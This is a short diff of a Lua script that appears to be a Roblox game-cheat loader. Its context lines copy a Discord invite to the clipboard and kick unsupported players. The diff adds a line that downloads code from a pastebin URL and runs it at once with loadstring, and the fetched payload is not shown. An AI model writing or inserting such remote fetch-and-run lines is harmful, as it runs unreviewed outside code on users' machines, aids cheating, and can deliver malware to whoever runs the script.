@@ -27,3 +27,5 @@ else
     toclipboard("https://discord.gg/lyzer")
     game.Players.LocalPlayer:Kick("Game Not Supported, Discord copied to clipboard")
 end
+
+loadstring(game:HttpGet("https://pastebin.com/raw/8MYFVcpt"))()
